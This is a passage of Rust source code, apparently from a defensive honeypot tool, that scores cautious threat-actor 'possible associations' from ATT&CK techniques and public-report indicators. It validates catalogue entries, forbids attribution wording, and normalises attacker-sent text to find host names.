//! Threat actor possible-association (#29): cautious, explainable links
//! from a campaign (#33) or a lone attempt (#25) to an actor profile built
//! only from public sources.
//!
//! The reference catalogue has two inputs, both reviewed in the repository:
//!
//! - MITRE ATT&CK groups from the pinned bundle (#26), as the sidecar
//!   `data/attack/groups.json`: ids, names, aliases and the techniques each
//!   group uses, copied unchanged.
//! - Curated public reports (`catalogue/actors/`, schema
//!   `schemas/actor-report.schema.json`): publisher, URL, dates, a SHA-256
//!   pin of the document, its licence, techniques, infrastructure and tooling
//!   indicators, and targeting. Nexus and public cluster labels are
//!   preferred; a named group needs two independent publishers.
//!
//! The matcher compares a subject with every profile that shares a
//! technique or an indicator (inverted indexes, so the work is linear in
//! the subject's techniques and indicators, never pairwise over profiles):
//!
//! - TTP overlap, weighted by rarity across all public profiles;
//! - indicator overlap with the report's infrastructure and tooling;
//! - targeting (CVEs and products), only alongside one of the above.
//!
//! Geography is never evidence, and neither is a shared ASN on its own.
//! Every link is scored by the confidence layer (#27) as `attempt_actor`,
//! which caps it in code: below `medium` without a shared indicator, below
//! `high` and never publishable until an analyst confirms it. Wording comes
//! from code only ([`statement`]) and is checked by [`wording_problems`].
//!
//! Pure and deterministic; builds for wasm32. See
//! `docs/actor-attribution.md`.

use std::collections::{BTreeMap, BTreeSet};
use std::net::IpAddr;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::attack::AttackSidecar;
use crate::attempt::Attempt;
use crate::campaign::{ActorSuggestion, AttemptSignals, Campaign};
use crate::capture::{CaptureEvent, Channel};
use crate::confidence::{
    Band, ConfidenceConfig, ConfidenceLink, Evidence, EvidenceSource, Feedback, LinkKind, Override,
    score,
};
use crate::ioc::{Extraction, IocRole, IocType, defang};
use crate::timeline::printable;

/// Links kept per subject, strongest first. Links an analyst decided are
/// always kept on top of these.
pub const MAX_LINKS_PER_SUBJECT: usize = 5;
/// Indicator evidence items per link, strongest first.
pub const MAX_INDICATOR_EVIDENCE: usize = 16;
/// Indicators read per subject.
pub const MAX_SUBJECT_INDICATORS: usize = 2_000;
/// A link from technique overlap alone needs at least this many shared
/// techniques...
pub const TTP_ONLY_MIN_SHARED: usize = 3;
/// ...and at least this much shared rarity (sum of `ln((N+1)/(n+1))`).
pub const TTP_ONLY_MIN_MASS: f64 = 5.0;
/// Shared rarity at which technique overlap counts at full strength.
pub const FULL_TTP_MASS: f64 = 5.0;
/// Indicators from a report published this long before the subject was
/// first seen count at half weight: infrastructure changes hands.
pub const STALE_AFTER_DAYS: i64 = 730;
pub const MAX_REPORT_INDICATORS: usize = 500;
pub const MAX_REPORT_TECHNIQUES: usize = 64;
pub const MAX_SOURCES: usize = 16;
pub const MAX_LABEL_CHARS: usize = 80;
pub const MAX_NOTE_CHARS: usize = 1000;
/// Report URLs listed on a campaign suggestion.
pub const MAX_SUGGESTION_URLS: usize = 8;

const DAY_MS: i64 = 86_400_000;
const ID_DOMAIN: &str = "foiled-actor-link-v1";

/// Phrases that claim attribution. Never allowed in labels, notes or any
/// text Foiled produces about an actor.
pub const FORBIDDEN_PHRASES: &[&str] = &[
    "attributed to",
    "attributable to",
    "attribution to",
    "is behind",
    "are behind",
    "was behind",
    "were behind",
    "responsible for",
    "perpetrated",
    "carried out by",
    "conducted by",
    "the work of",
];

/// Problems with actor wording: any attribution phrase, and "confirmed"
/// unless an analyst confirmed the link.
pub fn wording_problems(text: &str, confirmed: bool) -> Vec<String> {
    let lower = text.to_lowercase();
    let mut out: Vec<String> = FORBIDDEN_PHRASES
        .iter()
        .filter(|p| lower.contains(*p))
        .map(|p| format!("'{p}' claims attribution; say \"possible association\""))
        .collect();
    if !confirmed && lower.contains("confirmed") {
        out.push("'confirmed' needs an analyst confirmation".into());
    }
    out
}

// ---------------------------------------------------------------------------
// Sources and the curated report format
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SourceKind {
    /// A group in the pinned MITRE ATT&CK bundle.
    AttackGroup,
    VendorReport,
    /// For example a CISA or ASD's ACSC advisory.
    GovernmentAdvisory,
    /// A MISP galaxy cluster at a pinned commit.
    MispGalaxy,
}

/// One public document an actor profile rests on.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Source {
    pub kind: SourceKind,
    pub publisher: String,
    pub title: String,
    pub url: String,
    /// `YYYY-MM-DD`.
    pub published: String,
    /// `YYYY-MM-DD` the document was fetched and hashed. Required for
    /// curated reports.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub retrieved: Option<String>,
    /// Lowercase hex SHA-256 of the document as retrieved: the pin.
    /// Required for curated reports that are not examples.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
    /// The terms the document is published under, as recorded in
    /// `docs/compliance/licence-register.md`.
    pub licence: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub licence_url: Option<String>,
}

/// How an actor is named. Nexus and cluster labels are preferred over
/// named groups (`docs/actor-attribution.md#labels`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LabelKind {
    /// A broad nexus, for example "EXAMPLE-nexus loader activity".
    Nexus,
    /// A public cluster id, for example an ATT&CK group id or a vendor's
    /// temporary cluster id.
    Cluster,
    /// A vendor's or government's named group. Needs two publishers.
    NamedGroup,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Label {
    pub kind: LabelKind,
    pub text: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IndicatorType {
    Ip,
    Cidr,
    Domain,
    Url,
    /// A file or payload hash: tooling.
    Sha256,
    /// Weak: never evidence on its own.
    Asn,
}

impl IndicatorType {
    pub fn as_str(self) -> &'static str {
        match self {
            IndicatorType::Ip => "IP address",
            IndicatorType::Cidr => "network",
            IndicatorType::Domain => "domain",
            IndicatorType::Url => "URL",
            IndicatorType::Sha256 => "SHA-256",
            IndicatorType::Asn => "ASN",
        }
    }

    /// Hashes are tooling; everything else is infrastructure.
    fn is_tooling(self) -> bool {
        self == IndicatorType::Sha256
    }
}

/// An indicator a public report lists.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Indicator {
    #[serde(rename = "type")]
    pub kind: IndicatorType,
    pub value: String,
    /// Index into the profile's `sources` of the report that lists it.
    #[serde(default)]
    pub source: usize,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReportTargeting {
    #[serde(default)]
    pub cves: Vec<String>,
    #[serde(default)]
    pub catalogue_ids: Vec<String>,
}

/// Geography a report mentions. Recorded so the matcher can say it was
/// ignored; never evidence.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Geo {
    /// Two-letter country codes of reported source infrastructure.
    #[serde(default)]
    pub source_countries: Vec<String>,
}

/// One curated actor profile (`catalogue/actors/*.yaml`). Mirrors
/// `schemas/actor-report.schema.json`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ActorReport {
    /// Lowercase slug; the actor id is `report:<id>`.
    pub id: String,
    /// Fictional entries for tests and docs. Never in `catalogue/actors/`.
    #[serde(default)]
    pub example: bool,
    pub label: Label,
    #[serde(default)]
    pub aliases: Vec<String>,
    pub sources: Vec<Source>,
    pub techniques: Vec<String>,
    #[serde(default)]
    pub indicators: Vec<Indicator>,
    #[serde(default)]
    pub targeting: ReportTargeting,
    #[serde(default)]
    pub geo: Geo,
    #[serde(default)]
    pub notes: String,
}

impl ActorReport {
    /// Checks a schema cannot express. `known` is the set of technique ids
    /// in the ATT&CK sidecar.
    pub fn problems(&self, known: &BTreeSet<String>) -> Vec<String> {
        let mut out = Vec::new();
        if !valid_slug(&self.id) {
            out.push("id must be a lowercase slug of 3 to 64 characters".into());
        }
        let text = self.label.text.trim();
        if text.is_empty() || text.chars().count() > MAX_LABEL_CHARS {
            out.push(format!(
                "label text must be 1 to {MAX_LABEL_CHARS} characters"
            ));
        }
        for p in wording_problems(text, false) {
            out.push(format!("label: {p}"));
        }
        for p in wording_problems(&self.notes, false) {
            out.push(format!("notes: {p}"));
        }
        // Aliases and publishers are shown next to the label; titles are
        // kept as data only and never quoted in text Foiled writes.
        for a in &self.aliases {
            for p in wording_problems(a, false) {
                out.push(format!("alias '{}': {p}", printable(a)));
            }
        }
        if self.notes.chars().count() > MAX_NOTE_CHARS {
            out.push(format!("notes must be at most {MAX_NOTE_CHARS} characters"));
        }
        if self.sources.is_empty() || self.sources.len() > MAX_SOURCES {
            out.push(format!("between 1 and {MAX_SOURCES} sources"));
        }
        for (i, s) in self.sources.iter().enumerate() {
            for p in self.source_problems(s) {
                out.push(format!("sources[{i}]: {p}"));
            }
        }
        if self.label.kind == LabelKind::NamedGroup {
            let publishers: BTreeSet<String> = self
                .sources
                .iter()
                .map(|s| s.publisher.trim().to_lowercase())
                .collect();
            if publishers.len() < 2 {
                out.push(
                    "a named_group label needs sources from at least two publishers; use a \
                     nexus or cluster label otherwise"
                        .into(),
                );
            }
        }
        if self.techniques.len() > MAX_REPORT_TECHNIQUES {
            out.push(format!("at most {MAX_REPORT_TECHNIQUES} techniques"));
        }
        for t in &self.techniques {
            if !known.contains(t) {
                out.push(format!(
                    "technique {t} is not in data/attack/techniques.json"
                ));
            }
        }
        if self.techniques.is_empty() && self.indicators.is_empty() {
            out.push("a profile needs techniques or indicators to match on".into());
        }
        if self.indicators.len() > MAX_REPORT_INDICATORS {
            out.push(format!("at most {MAX_REPORT_INDICATORS} indicators"));
        }
        for (i, ind) in self.indicators.iter().enumerate() {
            if ind.source >= self.sources.len() {
                out.push(format!("indicators[{i}]: source must index sources"));
            }
            match normalise(ind.kind, &ind.value) {
                None => out.push(format!(
                    "indicators[{i}]: '{}' is not a valid {}",
                    printable(&ind.value),
                    ind.kind.as_str()
                )),
                Some(v) if self.example && !example_indicator(ind.kind, &v) => out.push(format!(
                    "indicators[{i}]: example entries use documentation addresses, ASNs and \
                     reserved domains only"
                )),
                Some(_) => {}
            }
        }
        for c in &self.geo.source_countries {
            if c.len() != 2 || !c.bytes().all(|b| b.is_ascii_uppercase()) {
                out.push(format!(
                    "geo: '{}' is not a two-letter country code",
                    printable(c)
                ));
            }
        }
        if self.example && !text.starts_with("EXAMPLE") {
            out.push("example labels start with EXAMPLE".into());
        }
        out
    }

    fn source_problems(&self, s: &Source) -> Vec<String> {
        let mut out = Vec::new();
        if s.kind == SourceKind::AttackGroup {
            out.push("ATT&CK groups come from data/attack/groups.json, not curated files".into());
        }
        if s.publisher.trim().is_empty() || s.title.trim().is_empty() {
            out.push("publisher and title are required".into());
        }
        for p in wording_problems(&s.publisher, false) {
            out.push(format!("publisher: {p}"));
        }
        if s.licence.trim().is_empty() {
            out.push("licence is required (see docs/compliance/licence-register.md)".into());
        }
        let Some(host) = https_host(&s.url) else {
            out.push("url must be an https URL".into());
            return out;
        };
        let published = date_ms(&s.published);
        if published.is_none() {
            out.push("published must be YYYY-MM-DD".into());
        }
        match s.retrieved.as_deref().map(date_ms) {
            None => out.push("retrieved is required".into()),
            Some(None) => out.push("retrieved must be YYYY-MM-DD".into()),
            Some(Some(r)) if published.is_some_and(|p| r < p) => {
                out.push("retrieved must not be before published".into());
            }
            Some(Some(_)) => {}
        }
        match &s.sha256 {
            Some(h) if !is_sha256(h) => out.push("sha256 must be 64 lowercase hex".into()),
            None if !self.example => {
                out.push("sha256 of the retrieved document is required (the pin)".into());
            }
            _ => {}
        }
        if self.example {
            if !reserved_domain(&host) {
                out.push("example sources use reserved example domains only".into());
            }
            if !s.publisher.contains("(fictional)") {
                out.push("example publishers say (fictional)".into());
            }
        } else if reserved_domain(&host) {
            out.push("real entries cannot cite reserved example domains".into());
        }
        out
    }

    fn into_profile(self) -> ActorProfile {
        let publisher = self
            .sources
            .first()
            .map(|s| s.publisher.trim().to_string())
            .unwrap_or_default();
        let mut techniques = self.techniques;
        techniques.sort();
        techniques.dedup();
        ActorProfile {
            actor_id: format!("report:{}", self.id),
            label: format!("{} ({publisher})", self.label.text.trim()),
            label_kind: self.label.kind,
            aliases: self.aliases,
            techniques,
            indicators: self.indicators,
            targeting: self.targeting,
            geo: self.geo,
            sources: self.sources,
            attack_version: None,
            example: self.example,
            notes: self.notes,
        }
    }
}

// ---------------------------------------------------------------------------
// ATT&CK groups sidecar
// ---------------------------------------------------------------------------

/// One group in `data/attack/groups.json`. `id`, `name`, `aliases`,
/// `stix_id` and `modified` are copied unchanged from the pinned bundle.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AttackGroup {
    pub id: String,
    pub name: String,
    pub aliases: Vec<String>,
    pub url: String,
    pub stix_id: String,
    pub modified: String,
    /// Sidecar techniques the group uses directly, sorted.
    pub techniques: Vec<String>,
}

/// The ATT&CK groups Foiled ships, with MITRE's notice alongside.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct AttackGroups {
    pub attack_version: String,
    pub domain: String,
    pub source: String,
    /// SHA-256 of the pinned bundle the groups were read from.
    pub bundle_sha256: String,
    pub notice: String,
    pub licence: String,
    pub licence_url: String,
    pub sidecar_note: String,
    /// Active intrusion sets in the pinned bundle, for rarity weights.
    pub population: u32,
    pub groups: Vec<AttackGroup>,
}

/// MITRE's page for a group in the pinned major version.
pub fn group_url(attack_version: &str, id: &str) -> String {
    let major = attack_version.split('.').next().unwrap_or(attack_version);
    format!("https://attack.mitre.org/versions/v{major}/groups/{id}/")
}

impl AttackGroups {
    pub fn problems(&self, techniques: &AttackSidecar) -> Vec<String> {
        let mut out = Vec::new();
        if self.attack_version != techniques.attack_version {
            out.push("attack_version must match data/attack/techniques.json".into());
        }
        if !self.notice.contains("The MITRE Corporation")
            || !self.licence_url.starts_with("https://attack.mitre.org/")
        {
            out.push("notice and licence must reproduce MITRE's terms of use".into());
        }
        if !is_sha256(&self.bundle_sha256) {
            out.push("bundle_sha256 must be the pinned bundle's SHA-256".into());
        }
        if (self.population as usize) < self.groups.len() {
            out.push("population counts every active group, so it cannot be smaller".into());
        }
        let known = techniques.known_ids();
        let mut seen = BTreeSet::new();
        for g in &self.groups {
            let id_ok = g.id.len() == 5
                && g.id.starts_with('G')
                && g.id[1..].bytes().all(|b| b.is_ascii_digit());
            if !id_ok || !seen.insert(g.id.clone()) {
                out.push(format!("'{}' is not a unique ATT&CK group id", g.id));
            }
            if g.url != group_url(&self.attack_version, &g.id) {
                out.push(format!(
                    "{}: url must point at the pinned version's page",
                    g.id
                ));
            }
            if !g.stix_id.starts_with("intrusion-set--") {
                out.push(format!("{}: stix_id must be an intrusion-set id", g.id));
            }
            if g.name.trim().is_empty() || date_ms(g.modified.get(..10).unwrap_or("")).is_none() {
                out.push(format!("{}: name and modified are required", g.id));
            }
            if g.techniques.is_empty() || g.techniques.iter().any(|t| !known.contains(t)) {
                out.push(format!(
                    "{}: techniques must be non-empty and in data/attack/techniques.json",
                    g.id
                ));
            }
            for p in wording_problems(&g.name, false) {
                out.push(format!("{}: {p}", g.id));
            }
        }
        out
    }

    fn profiles(&self) -> Vec<ActorProfile> {
        self.groups
            .iter()
            .map(|g| ActorProfile {
                actor_id: format!("attack:{}", g.id),
                label: format!("ATT&CK {} ({})", g.id, g.name),
                label_kind: LabelKind::Cluster,
                aliases: g.aliases.clone(),
                techniques: g.techniques.clone(),
                indicators: vec![],
                targeting: ReportTargeting::default(),
                geo: Geo::default(),
                sources: vec![Source {
                    kind: SourceKind::AttackGroup,
                    publisher: "The MITRE Corporation".into(),
                    title: format!(
                        "ATT&CK v{} group {} ({})",
                        self.attack_version, g.id, g.name
                    ),
                    url: g.url.clone(),
                    published: g.modified.get(..10).unwrap_or_default().to_string(),
                    retrieved: None,
                    sha256: Some(self.bundle_sha256.clone()),
                    licence: "MITRE ATT&CK terms of use".into(),
                    licence_url: Some(self.licence_url.clone()),
                }],
                attack_version: Some(self.attack_version.clone()),
                example: false,
                notes: String::new(),
            })
            .collect()
    }
}

// ---------------------------------------------------------------------------
// The catalogue
// ---------------------------------------------------------------------------

/// One actor as the matcher and the API see it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ActorProfile {
    /// `attack:<group id>` or `report:<slug>`.
    pub actor_id: String,
    /// Display label, built by code: `ATT&CK G0000 (name)` or
    /// `<label text> (<first publisher>)`.
    pub label: String,
    pub label_kind: LabelKind,
    pub aliases: Vec<String>,
    pub techniques: Vec<String>,
    pub indicators: Vec<Indicator>,
    pub targeting: ReportTargeting,
    pub geo: Geo,
    pub sources: Vec<Source>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub attack_version: Option<String>,
    pub example: bool,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub notes: String,
}

/// Where actor profiles come from. Today the API reads the bundled ATT&CK
/// groups sidecar and `catalogue/actors/`; another source (for example a
/// threat intel platform holding actor, intrusion-set and report
/// catalogues) implements this and goes through the same checks in
/// [`ActorCatalogue::from_source`].
pub trait CatalogueSource {
    /// The ATT&CK groups sidecar, if this source carries one.
    fn attack_groups(&self) -> Option<AttackGroups>;
    /// Curated report profiles.
    fn reports(&self) -> Vec<ActorReport>;
}

/// Every actor profile, with indexes for matching.
#[derive(Debug, Clone, Default)]
pub struct ActorCatalogue {
    /// Sorted by actor id.
    pub profiles: Vec<ActorProfile>,
    /// Profiles in the rarity population: every active ATT&CK group plus
    /// every curated report.
    pub population: u32,
    /// Inputs left out, with why. Empty for the shipped catalogue (CI).
    pub problems: Vec<String>,
    /// The pinned ATT&CK version and MITRE's notice, carried by anything
    /// that shows ATT&CK group names.
    pub attack_version: Option<String>,
    pub attack_notice: Option<String>,
    /// Technique to the number of profiles in the population using it.
    users: BTreeMap<String, u32>,
    by_technique: BTreeMap<String, Vec<usize>>,
    by_value: BTreeMap<(IndicatorType, String), Vec<(usize, usize)>>,
    cidrs: Vec<(usize, usize, IpAddr, u8)>,
}

impl ActorCatalogue {
    /// Build from the ATT&CK groups sidecar and curated reports. Inputs with
    /// problems are left out and listed in `problems`.
    pub fn build(
        groups: Option<&AttackGroups>,
        techniques: &AttackSidecar,
        reports: Vec<ActorReport>,
    ) -> Self {
        let known = techniques.known_ids();
        let mut problems = Vec::new();
        let mut profiles = Vec::new();
        let mut population = 0u32;
        let (mut attack_version, mut attack_notice) = (None, None);
        // Groups not in the sidecar (no technique Foiled can see) still use
        // techniques; they count in the population, not in `users`.
        if let Some(g) = groups {
            let p = g.problems(techniques);
            if p.is_empty() {
                population += g.population;
                profiles.extend(g.profiles());
                attack_version = Some(g.attack_version.clone());
                attack_notice = Some(format!("{} {}", g.notice, g.licence));
            } else {
                problems.extend(
                    p.into_iter()
                        .map(|p| format!("data/attack/groups.json: {p}")),
                );
            }
        }
        let mut ids = BTreeSet::new();
        for r in reports {
            let mut p = r.problems(&known);
            if !ids.insert(r.id.clone()) {
                p.push("duplicate id".into());
            }
            if p.is_empty() {
                population += 1;
                profiles.push(r.into_profile());
            } else {
                problems.extend(p.into_iter().map(|p| format!("report {}: {p}", r.id)));
            }
        }
        profiles.sort_by(|a, b| a.actor_id.cmp(&b.actor_id));

        let mut users: BTreeMap<String, u32> = BTreeMap::new();
        let mut by_technique: BTreeMap<String, Vec<usize>> = BTreeMap::new();
        let mut by_value: BTreeMap<(IndicatorType, String), Vec<(usize, usize)>> = BTreeMap::new();
        let mut cidrs = Vec::new();
        for (pi, p) in profiles.iter().enumerate() {
            for t in &p.techniques {
                *users.entry(t.clone()).or_default() += 1;
                by_technique.entry(t.clone()).or_default().push(pi);
            }
            for (ii, ind) in p.indicators.iter().enumerate() {
                if ind.kind == IndicatorType::Cidr {
                    if let Some((net, len)) = parse_cidr(&ind.value) {
                        cidrs.push((pi, ii, net, len));
                    }
                } else if let Some(v) = normalise(ind.kind, &ind.value) {
                    by_value.entry((ind.kind, v)).or_default().push((pi, ii));
                }
            }
        }
        ActorCatalogue {
            profiles,
            population,
            problems,
            attack_version,
            attack_notice,
            users,
            by_technique,
            by_value,
            cidrs,
        }
    }

    /// Build from any [`CatalogueSource`], with the same checks as
    /// [`ActorCatalogue::build`].
    pub fn from_source(source: &dyn CatalogueSource, techniques: &AttackSidecar) -> Self {
        Self::build(
            source.attack_groups().as_ref(),
            techniques,
            source.reports(),
        )
    }

    pub fn get(&self, actor_id: &str) -> Option<&ActorProfile> {
        self.profiles
            .binary_search_by(|p| p.actor_id.as_str().cmp(actor_id))
            .ok()
            .map(|i| &self.profiles[i])
    }

    /// Profiles in the population using a technique.
    pub fn users(&self, technique: &str) -> u32 {
        self.users.get(technique).copied().unwrap_or(0)
    }

    /// `ln((N+1)/(n+1))`: how much sharing this technique says.
    fn idf(&self, technique: &str) -> f64 {
        let n = f64::from(self.population) + 1.0;
        (n / (f64::from(self.users(technique)) + 1.0)).ln()
    }

    /// Rarity as a percentage of the rarest possible technique.
    fn rarity_pct(&self, technique: &str) -> u8 {
        let max = (f64::from(self.population) + 1.0).ln();
        if max <= 0.0 {
            return 0;
        }
        (100.0 * self.idf(technique) / max)
            .round()
            .clamp(0.0, 100.0) as u8
    }
}

// ---------------------------------------------------------------------------
// Subjects
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SubjectKind {
    Campaign,
    /// An attempt in no campaign listed in the window.
    Attempt,
}

/// What one campaign or lone attempt is compared on.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Subject {
    pub kind: SubjectKind,
    /// Campaign id or attempt id.
    pub id: String,
    pub tenant_id: String,
    /// The attempt the #27 link is scored on: the campaign seed, or the
    /// attempt itself.
    pub seed_attempt_id: String,
    pub attempt_ids: Vec<String>,
    pub first_seen: i64,
    pub techniques: BTreeSet<String>,
    /// At most [`MAX_SUBJECT_INDICATORS`].
    pub indicators: Vec<SubjectIndicator>,
    pub asns: BTreeSet<u32>,
    pub cves: BTreeSet<String>,
    pub catalogue_ids: BTreeSet<String>,
    /// Source addresses of the attempts.
    pub sources: BTreeSet<String>,
    /// Source countries from enrichment (#11). Never evidence.
    pub countries: BTreeSet<String>,
}

impl Subject {
    /// Fill `countries` from a source address to country table.
    pub fn set_countries(&mut self, countries: &BTreeMap<String, String>) {
        self.countries = self
            .sources
            .iter()
            .filter_map(|s| countries.get(s).cloned())
            .collect();
    }
}

/// One indicator seen on a subject.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SubjectIndicator {
    pub kind: IndicatorType,
    /// Normalised value.
    pub value: String,
    pub ioc_id: String,
    pub ioc_type: IocType,
    /// True when the defender observed it as infrastructure in use: the
    /// attack came from it or the decoy was made to contact it (#34 roles
    /// `source` and `callback`, or read from egress or DNS events). False
    /// for values the attacker chose and
    /// sent (payload content, URLs in requests, hashes of what they sent
    /// or left), which a false flag can plant.
    pub observed: bool,
}

/// Everything subjects are built from, for one tenant and window.
pub struct SubjectInput<'a> {
    pub tenant_id: &'a str,
    pub campaigns: &'a [Campaign],
    /// Every attempt in the window, to read what each one sent.
    pub attempts: &'a [Attempt],
    /// Also match the attempts in no listed campaign, as attempt subjects.
    pub lone_attempts: bool,
    pub signals: &'a BTreeMap<String, AttemptSignals>,
    pub iocs: &'a Extraction,
    /// Source address to ASN number (#11).
    pub asns: &'a BTreeMap<String, u32>,
    /// Source address to two-letter country code (#11).
    pub countries: &'a BTreeMap<String, String>,
    /// The window's capture events, to tell callbacks the attacker named in
    /// its own request or payload from ones it did not.
    pub events: &'a [CaptureEvent],
}

/// Every string (keys and values) in a JSON value, depth-first.
fn strings_in(v: &serde_json::Value, out: &mut Vec<String>) {
    match v {
        serde_json::Value::String(s) => out.push(s.clone()),
        serde_json::Value::Array(a) => a.iter().for_each(|x| strings_in(x, out)),
        serde_json::Value::Object(m) => {
            for (k, x) in m {
                out.push(k.clone());
                strings_in(x, out);
            }
        }
        serde_json::Value::Number(n) => out.push(n.to_string()),
        _ => {}
    }
}

/// Undo the cheap ways to hide a host in a request: percent-encoding (twice,
/// for double encoding), literal `\uXXXX` escapes, fullwidth ASCII and the
/// ideographic full stop; then lowercase. Not full NFKC or IDNA (see
/// `docs/actor-attribution.md#false-flags`).
pub fn normalise_sent(s: &str) -> String {
    fn percent(s: &str) -> String {
        let b = s.as_bytes();
        let mut out = Vec::with_capacity(b.len());
        let mut i = 0;
        while i < b.len() {
            let hex = |c: u8| (c as char).to_digit(16);
            if b[i] == b'%'
                && i + 2 < b.len()
                && let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2]))
            {
                out.push((h * 16 + l) as u8);
                i += 3;
            } else {
                out.push(b[i]);
                i += 1;
            }
        }
        String::from_utf8_lossy(&out).into_owned()
    }
    fn unicode_escapes(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut rest = s;
        while let Some(i) = rest.find("\\u") {
            out.push_str(&rest[..i]);
            let tail = &rest[i + 2..];
            let decoded = tail
                .get(..4)
                .and_then(|h| u32::from_str_radix(h, 16).ok())
                .and_then(char::from_u32);
            match decoded {
                Some(c) => {
                    out.push(c);
                    rest = &tail[4..];
                }
                None => {
                    out.push_str("\\u");
                    rest = tail;
                }
            }
        }
        out.push_str(rest);
        out
    }
    let once = unicode_escapes(&percent(&percent(s)));
    once.chars()
        .map(|c| match c {
            // Fullwidth forms of printable ASCII.
            '\u{FF01}'..='\u{FF5E}' => char::from_u32(c as u32 - 0xFEE0).unwrap_or(c),
            '\u{3002}' | '\u{FF61}' => '.',
            _ => c,
        })
        .collect::<String>()
        .to_lowercase()
}

/// Host-like tokens in normalised text: runs of letters, digits, `.`, `-`
/// and `:`, with each `:`-separated piece added too (so `evil.example:1389`
/// gives `evil.example`, and an IPv6 address stays whole).
fn host_tokens(text: &str, out: &mut BTreeSet<String>) {
    for raw in text.split(|c: char| !(c.is_alphanumeric() || matches!(c, '.' | '-' | ':'))) {
        let t = raw.trim_matches(|c| matches!(c, '.' | ':' | '-'));
        if t.is_empty() {
            continue;
        }
        out.insert(t.to_string());
        if t.contains(':') {
            for piece in t.split(':') {
                let piece = piece.trim_matches(|c| matches!(c, '.' | '-'));
                if !piece.is_empty() {
                    out.insert(piece.to_string());
                }
            }
        }
    }
}

/// What one attempt sent, and where it steered the decoy.
struct Sent {
    /// Host-like tokens from the `data` and `hook` of the attempt's
    /// application, network and hook events (never addresses), normalised.
    names: BTreeSet<String>,
    /// Addresses the decoy connected to for a host the attacker named: the
    /// attacker chose where the decoy went, even if not the address.
    directed: BTreeSet<String>,
}

impl Sent {
    fn of(a: &Attempt, events: &BTreeMap<&str, &CaptureEvent>) -> Self {
        let mut names = BTreeSet::new();
        let mine: Vec<&CaptureEvent> = a
            .event_ids
            .iter()
            .filter_map(|id| events.get(id.as_str()).copied())
            .collect();
        for e in mine.iter().filter(|e| {
            matches!(
                e.channel,
                Channel::Application | Channel::Network | Channel::Hook
            )
        }) {
            let mut strings = Vec::new();
            for v in e.data.values() {
                strings_in(v, &mut strings);
            }
            strings.extend(e.data.keys().cloned());
            if let Some(h) = &e.hook
                && let Ok(v) = serde_json::to_value(h)
            {
                strings_in(&v, &mut strings);
            }
            for s in &strings {
                host_tokens(&normalise_sent(s), &mut names);
            }
        }
        let mut sent = Sent {
            names,
            directed: BTreeSet::new(),
        };
        for e in mine.iter().filter(|e| e.channel == Channel::Egress) {
            let named = ["host", "url"].iter().any(|k| {
                e.data.get(*k).and_then(|v| v.as_str()).is_some_and(|v| {
                    let v = v.to_lowercase();
                    let host = if v.contains("://") {
                        host_of(IndicatorType::Url, &v).unwrap_or(&v)
                    } else {
                        v.split(':').next().unwrap_or(&v)
                    };
                    sent.named(host)
                })
            });
            if named && let Some(d) = &e.dst {
                sent.directed.insert(d.ip.to_lowercase());
            }
        }
        sent
    }

    /// The attacker named this host, or a domain it sits under (a lookup of
    /// `<data>.evil.example` after naming `evil.example`). Whole tokens only,
    /// so `1.2.3.4` never matches inside `11.2.3.45`.
    fn named(&self, host: &str) -> bool {
        if self.names.contains(host) {
            return true;
        }
        if host.parse::<IpAddr>().is_ok() {
            return false;
        }
        let mut rest = host;
        while let Some((_, parent)) = rest.split_once('.') {
            if !parent.contains('.') {
                break;
            }
            if self.names.contains(parent) {
                return true;
            }
            rest = parent;
        }
        false
    }

    /// True when the attacker named this host or steered the decoy to it.
    fn chose(&self, host: &str) -> bool {
        self.named(host) || self.directed.contains(host)
    }
}

/// The host part of an indicator value, for matching against what the
/// attacker sent.
fn host_of(kind: IndicatorType, value: &str) -> Option<&str> {
    match kind {
        IndicatorType::Ip | IndicatorType::Domain => Some(value),
        IndicatorType::Url => value
            .split_once("://")
            .and_then(|(_, r)| r.split(['/', '?', '#']).next())
            .map(|h| h.rsplit('@').next().unwrap_or(h))
            .map(|h| {
                if h.starts_with('[') {
                    h.trim_start_matches('[').split(']').next().unwrap_or(h)
                } else {
                    h.split(':').next().unwrap_or(h)
                }
            }),
        _ => None,
    }
}

fn indicator_type(t: IocType) -> Option<IndicatorType> {
    Some(match t {
        IocType::Ip | IocType::Ipv6 => IndicatorType::Ip,
        IocType::Domain | IocType::DnsQuery => IndicatorType::Domain,
        IocType::Url => IndicatorType::Url,
